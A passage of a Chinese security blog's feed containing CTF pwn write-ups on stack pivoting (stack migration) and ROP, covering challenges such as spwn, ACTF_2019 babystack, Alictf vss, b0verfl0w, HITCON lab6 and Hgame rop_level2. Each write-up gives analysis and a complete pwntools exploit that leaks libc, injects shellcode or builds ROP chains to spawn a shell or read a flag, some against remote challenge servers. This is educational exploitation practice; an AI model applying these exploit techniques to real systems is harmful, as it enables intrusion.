title="查保护和arch"></a>查保护和arch</h3><pre><code>  Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="尝试运行"><a href="#尝试运行" class="headerlink" title="尝试运行"></a>尝试运行</h3><p><img src="/2020/02/11/Stack Migration题目练习/images/15817739064330.jpg" srcset="/img/loading.gif" alt="-w602"></p><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>直接看漏洞函数</p><pre><code>ssize_t vul_function(){  size_t v0; // eax  size_t v1; // eax  char buf; // [esp+0h] [ebp-18h]  v0 = strlen(m1);  write(1, m1, v0);                             // Hello good Ctfer  read(0, &amp;s, 0x200u);  v1 = strlen(m2);  write(1, m2, v1);                             // What do you want to say?  return read(0, &amp;buf, 0x20u);}</code></pre><p>发现可以利用的gadget只有一个，那就只有leave的gadget了，然后把ebp控制到前面的read函数的s处，其也是全局变量，地址固定。<br><img src="/2020/02/11/Stack Migration题目练习/images/15817774030678.jpg" srcset="/img/loading.gif" alt="-w358"></p><h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>在第一个read的时候，直接把构造的rop链读进去。任务分别是leak 一个函数的内存地址，来用libcseacher算出system，跟/bin/sh字符串的地址，返回start函数清理栈开启第二次使用漏洞； call system（/bin/sh）</li><li>然后第二个read时候，把控ebp指向固定地址s的地址，retaddress 放上leave的gadget。</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;from LibcSearcher import *e = ELF(&#39;./spwn&#39;)io = process(&#39;./spwn&#39;)# libc = e.libcio = remote(&#39;node3.buuoj.cn&#39;,28527)padding = 24s = 0x0804A300fake1 = 0x0804A500leave_ret = 0x08048511puts_add = e.symbols[&#39;puts&#39;]write_plt = e.symbols[&#39;write&#39;]write_got = e.got[&#39;write&#39;]io.recvuntil(&#39;name?&#39;)p = flat([fake1,write_plt,0x080483A0,1,write_got,10])io.send(p)io.recvuntil(&#39;say?&#39;)p = padding * &#39;a&#39; + p32(s) + p32(leave_ret)# raw_input(&#39;-&gt;&#39;)io.send(p)write_add = u32(io.recv(4))print(hex(write_add))obj = LibcSearcher(&#39;write&#39;,write_add)libc_base = write_add - obj.dump(&#39;write&#39;) #libc.symbols[&#39;write&#39;]print(hex(obj.dump(&#39;write&#39;)))print(hex(libc_base))sys_add = libc_base + obj.dump(&#39;system&#39;) #libc.symbols[&#39;system&#39;]binsh_add =libc_base + obj.dump(&#39;str_bin_sh&#39;) #libc.search(&#39;/bin/sh\x00&#39;).next()io.recvuntil(&#39;name?&#39;)p = flat([fake1,sys_add,0x080483A0,binsh_add])io.send(p)io.recvuntil(&#39;say?&#39;)p = padding * &#39;a&#39; + p32(s) + p32(leave_ret)io.send(p)io.interactive()</code></pre><h2 id="ACTF-2019-hardcore-fmt"><a href="#ACTF-2019-hardcore-fmt" class="headerlink" title="ACTF_ 2019_hardcore fmt"></a>ACTF_ 2019_hardcore fmt</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>￼￼￼￼<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/oj5gX3.png" srcset="/img/loading.gif" alt><br>其中可以看到后面的read处，存在一个栈溢出，但是只有一个gadget可以用，需要考虑Stack Migration。其中那个<strong>sub400a1a</strong>函数是问你需要留下多少的字节，肯定要<code>0xe0</code>，所以再送过去的时候就填入0xe0，正好做参数给下面read函数用。</p><p>然后程序接受到0xe0后，进入if语句中，会输出一下堆栈esp的值，这下也是相当于知道了一个特定的地址，然后就正常构造rop链，把控ebp等于为接收到的stack esp，再跟上leava gadget即可。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;# io = process(&#39;./ACTF_2019_babystack&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27626)io = remote(&#39;challenge-848a378609341016.sandbox.ctfhub.com&#39;, 24656)elf = ELF(&#39;./ACTF_2019_babystack&#39;)# libc = elf.libcio.recvuntil(&#39;message?\n&#39;)io.sendline(&#39;224&#39;)io.recvuntil(&#39;saved at&#39;)stack_addr =  int((io.recvline_contains(&#39;0x7f&#39;)),16)print(stack_addr)libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x000400ad3start_addr = 0x000400800leave_ret = 0x400a18 payload = flat([&#39;\x00&#39;*8,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr])payload = payload.ljust(208,&#39;a&#39;)payload += flat([stack_addr,leave_ret])io.recvuntil(&#39;&gt;&#39;)raw_input(&#39;-&gt;&#39;)io.send(payload)io.recvuntil(&#39;bye~\n&#39;)libc_start_main_addr = u64(io.recv(6).ljust(8,&#39;\x00&#39;)) #- libc.symbols[&#39;__libc_start_main&#39;]obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)libc_base = libc_start_main_addr - obj.dump(&#39;__libc_start_main&#39;)print(hex(libc_base))io.recvuntil(&#39;message?\n&#39;)io.sendline(&#39;224&#39;)io.recvuntil(&#39;saved at&#39;)stack_addr =  int((io.recvline_contains(&#39;0x7f&#39;)),16)print(stack_addr)rec = libc_base + 0x4f2c5payload = flat([&#39;\x00&#39;*8,rec])payload = payload.ljust(208,&#39;\x00&#39;)payload += flat([stack_addr,leave_ret])io.recvuntil(&#39;&gt;&#39;)raw_input(&#39;-&gt;&#39;)io.send(payload)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Stack-Migration题目练习&quot;&gt;&lt;a href=&quot;#Stack-Migration题目练习&quot; class=&quot;headerlink&quot; title=&quot;Stack Migration题目练习&quot;&gt;&lt;/a&gt;Stack Migration题目练习&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="Stack Migration" scheme="http://chumen77.xyz/tags/Stack-Migration/"/>
    
  </entry>
  
  <entry>
    <title>花式栈溢出（栈帧的调节）</title>
    <link href="http://chumen77.xyz/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/02/05/花式栈溢出（调节栈帧）/</id>
    <published>2020-02-05T08:53:11.000Z</published>
    <updated>2020-03-12T15:14:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="花式栈溢出（栈帧的调节）"><a href="#花式栈溢出（栈帧的调节）" class="headerlink" title="花式栈溢出（栈帧的调节）"></a>花式栈溢出（栈帧的调节）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。<br>在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括：</p><ul><li>加减esp值，控制栈指针</li><li>Stack Migration来构造一个假的栈帧。</li></ul><p>这里总结了2种题型：</p><h2 id="加减esp，把控栈指针"><a href="#加减esp，把控栈指针" class="headerlink" title="加减esp，把控栈指针"></a>加减esp，把控栈指针</h2><p>这种题型就需要用Ropgadget找一个控制esp的gadget，然后简单修改esp值的大小，来满足我们的需求。</p><h3 id="Alictf-016-vss"><a href="#Alictf-016-vss" class="headerlink" title="Alictf_016_vss"></a>Alictf_016_vss</h3><p>这个题目就是一个修改esp扩大栈空间，从而构造rop链获取shell的题目。</p><h4 id="检查保护和arch"><a href="#检查保护和arch" class="headerlink" title="检查保护和arch"></a>检查保护和arch</h4><p><img src="http://qiqianyun.chumen77.xyz/15808931260368.jpg" srcset="/img/loading.gif" alt="-w446"></p><h4 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h4><p>由于这个程序使用静态编译和strip命令剥离符号，用ida打开没有我们平时看的那么简单，<br>很多函数已经无法识别，我们就需要自己调试，然后推测是什么函数。<br><img src="http://qiqianyun.chumen77.xyz/15808932166761.jpg" srcset="/img/loading.gif" alt="-w618"><br>start函数中，call的函数是__libc_start_main, 上一行的 offset则是main函数<br>那个箭头就是main函数了。进入main函数以后，<strong>可以经过syscall中rax的参数来确认其是什么函数</strong>，很明显一个函数是alarm函数，先手动nop一下。<br><img src="http://qiqianyun.chumen77.xyz/15808934501240.jpg" srcset="/img/loading.gif" alt="-w555"><br>把这个函数去除后，方便gdb的后期调试。接着可以很容易确定一下puts函数跟read函数，在ida中修改一下。<img src="http://qiqianyun.chumen77.xyz/15808936171885.jpg" srcset="/img/loading.gif" alt="-w528"><br>下面那个40108e函数是比较复杂的，我用edb动态调试来确定出其中的某些函数：<br><img src="http://qiqianyun.chumen77.xyz/15808938970186.jpg" srcset="/img/loading.gif" alt="-w857"><br>对于这个函数，先确定一下其参数。<br><img src="http://qiqianyun.chumen77.xyz/15808939630394.jpg" srcset="/img/loading.gif" alt="-w824"><br><img src="http://qiqianyun.chumen77.xyz/15808939828470.jpg" srcset="/img/loading.gif" alt="-w322"><br>dump过去就会发现是复制了一份。所以就确定这个函数是<code>strncpy</code>是函数。<br>对于这个函数<code>char *strncpy(char *dest, const char *src, int n)</code><strong>将src指向的字符数组中n个字符复制到dest指向的字符数组中，在第一个空字符处停止，并返回被复制后的dest</strong>。<br><img src="http://qiqianyun.chumen77.xyz/15808946102427.jpg" srcset="/img/loading.gif" alt="-w781"><br>对于下一段就是判断一下，是否与0x79和0x70相等，可以来手动修改值让其相等。<br><img src="http://qiqianyun.chumen77.xyz/15808947377600.jpg" srcset="/img/loading.gif" alt="-w803"><br>往后走会发现先溢出了，在做溢出题的时候看到return 就应该想办法想上跳。<br><img src="http://qiqianyun.chumen77.xyz/15808948243514.jpg" srcset="/img/loading.gif" alt="-w368"><br>溢出的这个地址就是刚刚又syrcpy函数复制过来0x50字节中的最后8个字节，因为是strncpy函数，<strong>我们输入的字符串中是不能有\x00</strong>，否则会被截断，从而无法复制满0x50字节制造可控溢出，所以前0x48个字节中，我们不能写入任何地址。在这种情况下就需要通过修改esp来完成漏洞利用。</p><p>在最前面的read函数中，给了十分大的缓冲区可以用，我们可以把ROP链放在0x50字节之后，然后通过增加esp的值把栈顶抬到ROP链上，紧接着执行这个rop链即可。</p><p>查到one_gadget发现<code>0x000000000046f205 : add rsp, 0x58 ; ret</code>正好符合要求。然后gdb调试一下确定一下rop链从50个字节后的那里开始合适即可。<strong>（这个在找onegadget的时候注意不要把rsp搞成esp了，自己在做的时候因为这个调试了半天，才发现是这个错误，导致exp不成功）</strong></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *import timeio = process(&#39;./vss&#39;)e = ELF(&#39;./vss&#39;)io.recvuntil(&#39;Password:\n&#39;)add_rsp_0x58_ret = 0x0046f205pop_rax_ret = 0x0046f208pop_rdi_ret = 0x0401823pop_rsi_ret = 0x0401937pop_rdx_ret = 0x043ae05bss = 0x6C8178 -10syscall_ret = 0x0045f2a5rop1 = [    pop_rax_ret,    0,    pop_rdi_ret,    0,    pop_rsi_ret,    bss,    pop_rdx_ret,    10,    syscall_ret,    pop_rax_ret,    0x3b,    pop_rdi_ret,    bss,    pop_rsi_ret,    0,    pop_rdx_ret,    0,    syscall_ret]# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;py&#39; + &#39;a&#39;*70 + p64(add_rsp_0x58_ret)+ &#39;b&#39;* 8 + &#39;&#39;.join(map(p64,rop1)))# raw_input(&#39;-&gt;&#39;)sleep(0.1)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016-b0verfl0w"></a>X-CTF Quals 2016-b0verfl0w</h3><h4 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="http://qiqianyun.chumen77.xyz/15811429422510.jpg" srcset="/img/loading.gif" alt="-w438"><br>这个nx也没有开，可以用栈执行shellcode</p><h4 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h4><pre><code>signed int vul(){  char s; // [esp+18h] [ebp-20h]  puts(&quot;\n======================&quot;);  puts(&quot;\nWelcome to X-CTF 2016!&quot;);  puts(&quot;\n======================&quot;);  puts(&quot;What&#39;s your name?&quot;);  fflush(stdout);  fgets(&amp;s, 50, stdin);  printf(&quot;Hello %s.&quot;, &amp;s);  fflush(stdout);  return 1;}</code></pre><p>代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p><p>找一下控制esp的gadget<br>    0x08048504 : jmp esp<br>然后怎么控制eip到shellcode上呢，因为没有nx保护，我们可以写一段指令来控制偏移：</p><pre><code>sub esp,0x28jmp esp</code></pre><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *#io = process(&#39;./b0verfl0w&#39;)context.arch = &#39;i386&#39;io = remote(&#39;node3.buuoj.cn&#39;,29410)shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode += &quot;\x0b\xcd\x80&quot;sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)jmp_esp = 0x08048504payload = shellcode + (36-len(shellcode_x86))*&#39;b&#39;+p32(jmp_esp) + sub_esp_jmpio.readuntil(&#39;?\n&#39;)#raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们知道在函数建立栈帧时有两条指令<code>push ebp; mov ebp, esp</code>，而退出时同样需要消除这两条指令的影响，即<code>leave(mov esp, ebp; pop ebp)</code> 。且leave一般紧跟着就是ret。<strong>因此，在存在栈溢出的程序中，只要我们能控制到栈中的ebp，我们就可以通过两次leave劫持栈。</strong></p><p><img src="http://qiqianyun.chumen77.xyz/15813373484321.jpg" srcset="/img/loading.gif" alt="-w533"><br>第一次随着程序流<code>leave; ret</code>，new esp为我们构造新栈的目标地址。 可以看到执行到ret时，esp还在原来的old栈上，而ebp已经指向了新的栈的栈顶。<br><img src="https://s2.ax1x.com/2020/02/11/1ovtYT.jpg" srcset="/img/loading.gif" alt="1ovtYT.jpg"><br>第二次进入我们放入栈上的<code>leave; ret</code> 的gadget（<strong>这个是我们事先写上栈的</strong>）esp已经被成功劫持到新的栈上，执行完gadget后栈顶会 在new_esp-4(64位是-8)的位置上。此时栈完全可控了，通过预先或者之后在new stack上布置的rop链可以轻松完成攻击。<br><img src="https://s2.ax1x.com/2020/02/11/1oxKN6.png" srcset="/img/loading.gif" alt="1oxKN6.png"><br><img src="https://s2.ax1x.com/2020/02/11/1ovjXj.png" srcset="/img/loading.gif" alt="1ovjXj.png"></p><h3 id="HITCON-training-lab6-64位"><a href="#HITCON-training-lab6-64位" class="headerlink" title="HITCON_training_lab6_64位"></a>HITCON_training_lab6_64位</h3><p>这个是在HITCON_training的一个练习，直接给的有源码，我给编译成了64位版本。</p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre><code>#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre><p><code>gcc  -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令</p><h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><p>这个题纯粹就是为了练习的Stack Migration用的，可以不分析代码直接用gdb-peda直接来测试：<br><img src="http://qiqianyun.chumen77.xyz/15813398610900.jpg" srcset="/img/loading.gif" alt="-w332"><br><img src="http://qiqianyun.chumen77.xyz/15813398926858.jpg" srcset="/img/loading.gif" alt="-w955"><br>熟悉的栈溢出，但是下面多出来的一些字符串，也是程序不能接受的部分，也可以作为一个需要考虑栈迁移的标志。<br><img src="https://s2.ax1x.com/2020/02/11/1og2r9.jpg" srcset="/img/loading.gif" alt="1og2r9.jpg"><br>注意一下rsp被覆盖的值。<br><img src="https://s2.ax1x.com/2020/02/11/1ogs8U.jpg" srcset="/img/loading.gif" alt="1ogs8U.jpg"><br>计算padding为48.<br><img src="https://s2.ax1x.com/2020/02/11/1ogwEq.jpg" srcset="/img/loading.gif" alt="1ogwEq.jpg"><br>计算一下，可以填入多少的可控字段。去除一下刚刚程序不能存入的部分和padding部分，还有80个字节可以用。其中一个来伪造new esp，剩下也就还有9个gadget可以用，可以给我构造第一个rop链。</p><h4 id="图解分析"><a href="#图解分析" class="headerlink" title="图解分析"></a>图解分析</h4><p>假设我们已经填入了溢出字符，buf1即为我们要去的新栈，这个选择bss段的后一半：<br><img src="https://s2.ax1x.com/2020/02/11/1ogabn.jpg" srcset="/img/loading.gif" alt="1ogabn.jpg"><br>开始执行一下leave 中的<code>mov rsp,rbp</code>：<br><img src="https://s2.ax1x.com/2020/02/11/1ogUDs.jpg" srcset="/img/loading.gif" alt="1ogUDs.jpg"><br>此时rsp 也指向了 rbp指向的位置，在执行leave中的<code>pop rbp</code>:<br><img src="https://s2.ax1x.com/2020/02/11/1ocMfU.jpg" srcset="/img/loading.gif" alt="1ocMfU.jpg"><br>此时rbp已经到了我们伪造的新栈buf1，然后开始执行ret,进入执行pop_rdi的gadget:<br><img src="https://s2.ax1x.com/2020/02/11/1ocZmn.jpg" srcset="/img/loading.gif" alt="1ocZmn.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1ocklQ.jpg" srcset="/img/loading.gif" alt="1ocklQ.jpg"></p><p>此时已经将buf1的地址，推入rdi，作为gets的参数，执行gets函数后，我们就可以往buf1上填入我们的rop链，此时栈大小已经没有限制了，可以任意写。<br><img src="https://s2.ax1x.com/2020/02/11/1o6oo6.jpg" srcset="/img/loading.gif" alt="1o6oo6.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6gWF.jpg" srcset="/img/loading.gif" alt="1o6gWF.jpg"><br>在这个buf1的栈空间里，我们需要先把rbp指向的位置写入buf2（下一个构造的新栈），然后构造rop链把puts的内存地址给泄露出来，进而可以算出libc的基地址，接着再构造一个gets函数。接着是执行一下leave 的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o60Ln.jpg" srcset="/img/loading.gif" alt="1o60Ln.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6NRg.jpg" srcset="/img/loading.gif" alt="1o6NRg.jpg"><br>执行完以后就可以发现我们，已经完全控制了栈。并且开了一个buf2的新栈，留着在buf1调用gets函数时来在buf2新栈中摆上调用system(/bin/sh)函数的rop链。然后继续执行：<br><img src="https://s2.ax1x.com/2020/02/11/1o6tJS.jpg" srcset="/img/loading.gif" alt="1o6tJS.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6Yi8.jpg" srcset="/img/loading.gif" alt="1o6Yi8.jpg"><br>这就泄露出了puts函数的内存地址。接着开始往buf2新栈上读rop链:<br><img src="https://s2.ax1x.com/2020/02/11/1o6lqI.jpg" srcset="/img/loading.gif" alt="1o6lqI.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6QsA.jpg" srcset="/img/loading.gif" alt="1o6QsA.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6VIK.jpg" srcset="/img/loading.gif" alt="1o6VIK.jpg"><br>读入完成，接着再次执行leave的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o6AVx.jpg" srcset="/img/loading.gif" alt="1o6AVx.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1oyk4S.jpg" srcset="/img/loading.gif" alt="1oyk4S.jpg"><br>可以看到esp到了新栈，rbp因为刚刚在buf2填入的buf1，又会到了buf1，这个地址可以随便填了，对做题不影响，填写这个只是可以看到再次栈转移。接着执行buf2新栈的rop链：<br><img src="https://s2.ax1x.com/2020/02/11/1os600.jpg" srcset="/img/loading.gif" alt="1os600.jpg"><br>就可以拿到shell了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>借着这个思路就可以开始写exp:</p><pre><code>from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;e = ELF(&#39;./test&#39;)l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;) # io = remote(&#39;127.0.0.1&#39;,4000)io = process(&#39;./test&#39;)pop_rdi_ret = 0x400703pop_rsi_r15_ret= 0x0400701pop_rdx_ret= 0x0400724leave_ret= 0x0400699buf1 = 0x00602000 - 0x200buf2 = buf1 + 0x100padding = 56 - 8puts_plt = e.symbols[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]read_add = e.symbols[&#39;read&#39;]io.recvuntil(&#39;:&#39;)p = &#39;a&#39;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])#raw_input(&#39;-&gt;&#39;)io.send(p)sleep(0.1)p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret])sleep(0.1)#raw_input(&#39;-&gt;&#39;)io.sendline(p)io.recvuntil(&#39;\n&#39;)puts = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))libc = puts - l.symbols[&#39;puts&#39;]print(&#39;libc_base:&#39; + hex(libc))binsh_add = l.search(&#39;/bin/sh\x00&#39;).next() + libc#print(binsh_add)# raw_input(&#39;-&gt;&#39;)system_add = l.symbols[&#39;system&#39;] + libcp = flat([buf1,pop_rdi_ret,binsh_add,system_add])sleep(0.1)io.sendline(p)io.interactive()</code></pre><h3 id="Hgame2020-week2-rop-level2"><a href="#Hgame2020-week2-rop-level2" class="headerlink" title="Hgame2020_week2_rop_level2"></a>Hgame2020_week2_rop_level2</h3><h4 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="https://s2.ax1x.com/2020/02/11/1os8OI.jpg" srcset="/img/loading.gif" alt="1os8OI.jpg"><br>32位程序，开了nx保护</p><h4 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="https://s2.ax1x.com/2020/02/11/1osEO1.md.jpg" srcset="/img/loading.gif" alt="1osEO1.md.jpg"><br>这个明显的栈溢出，但是0x60-0x50-0x8 = 8。发现只有一个gadget位置，无法构造我们想要的rop链。但是前面的第一个read函数，可以读入很大空间，并且第二个参数buf的地址是固定的。<br><img src="https://s2.ax1x.com/2020/02/11/1orMMn.jpg" srcset="/img/loading.gif" alt="1orMMn.jpg"><br>那这个题明显就是可以Stack Migration来解决问题了，并且只需再写一个leave ret就控制栈了。</p><h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>程序中有着open，read，puts函数，我们可以写一个rop链，调用open函数，控制其参数是<code>./flag</code>，并在gdb中调试将其返回的文件fd号记录下来，然后传递给read函数，让其读入文件内容存入某个缓冲区，再用puts函数输出一下flag文件的内容即可。在第一个read的时候，我们就需要写好rop链。然后在最后一个read函数时，控制好ebp指向我们的新栈。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><pre><code>from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;# io = process(&#39;./ROP&#39;)io = remote(&#39;47.103.214.163&#39;,20300)e = ELF(&#39;./ROP&#39;)buf = 0x06010A0# libc = e.libcpadding = 80leave_ret = 0x040090dpop_rdi_ret = 0x00400a43pop_rsi_r15 = 0x00400a41open_plt = 0x4007b0read_plt = 0x400780puts_plt = 0x400760io.recvuntil(&#39;think so?\n&#39;)p = flat([&#39;./flag\x00\x00&#39;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])io.sendline(p)io.recvuntil(&#39;\n&#39;)p = padding * &#39;a&#39; + p64(buf) + p64(leave_ret)raw_input(&#39;-&gt;&#39;) #手动下一个断点，以后让gdb附加上进行调试io.send(p)flag = io.recvline_contains(&#39;hgame&#39;)print(flag)io.interactive()</code></pre><p>我们跟着exp来调试一下，看看效果：<br><img src="https://s2.ax1x.com/2020/02/11/1or3ZV.jpg" srcset="/img/loading.gif" alt="1or3ZV.jpg"><br>此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到<code>./flag</code>的字眼。执行一下leave：<br><img src="https://s2.ax1x.com/2020/02/11/1orGIU.jpg" srcset="/img/loading.gif" alt="1orGIU.jpg"><br>可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret：<br><img src="https://s2.ax1x.com/2020/02/11/1orQrq.jpg" srcset="/img/loading.gif" alt="1orQrq.jpg"><br>先记录下当前的状态，开始执行leave：<br><img src="https://s2.ax1x.com/2020/02/11/1or8aT.jpg" srcset="/img/loading.gif" alt="1or8aT.jpg"><br>执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入<code>./flag</code>，这个固定地址也做为给open函数做参数。<br><img src="https://s2.ax1x.com/2020/02/11/1ormGQ.jpg" srcset="/img/loading.gif" alt="1ormGQ.jpg"><br>在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag：<br><img src="https://s2.ax1x.com/2020/02/11/1oDzPe.jpg" srcset="/img/loading.gif" alt="1oDzPe.jpg"></p><h3 id="Stack-Migration小总结"><a href="#Stack-Migration小总结" class="headerlink" title="Stack Migration小总结"></a>Stack Migration小总结</h3><p> 这下可以总结下利用思路也就是</p><ul><li>把控好起初栈的ebp，在里面写入需要伪造的new esp</li><li>在之后的可利用字节中写入leave gadget</li><li>将想执行的ROP Chain写在已知固定位置上</li><li>再利用leave搬移Stack位置到已知位置</li><li>然后无限接ROP Chain</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;花式栈溢出（栈帧的调节）&quot;&gt;&lt;a href=&quot;#花式栈溢出（栈帧的调节）&quot; class=&quot;headerlink&quot; title=&quot;花式栈溢出（栈帧的调节）&quot;&gt;&lt;/a&gt;花式栈溢出（栈帧的调节）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="Stack Migration" scheme="http://chumen77.xyz/tags/Stack-Migration/"/>
    
  </entry>
  
  <entry>
    <title>ROP题目练习</title>
    <link href="http://chumen77.xyz/2020/02/03/ROP%E7%BB%83%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/02/03/ROP练习/</id>
    <published>2020-02-03T08:21:13.000Z</published>
    <updated>2020-04-15T09:01:35.315Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ROP题目练习"><a href="#ROP题目练习" class="headerlink" title="ROP题目练习"></a>ROP题目练习</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习栈溢出，做了一些ROP的练习题，基本都是buuoj的题目，搜索rop字眼找的rop题。简单记录一下收获和exp。</p><h1 id="有libc（或者无libc可做）"><a href="#有libc（或者无libc可做）" class="headerlink" title="有libc（或者无libc可做）"></a>有libc（或者无libc可做）</h1><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="OGeek2019_babyrop"></a>OGeek2019_babyrop</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807186229840.jpg" srcset="/img/loading.gif" alt="-w621"><br>32位程序，开启NX堆栈不可执行。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img 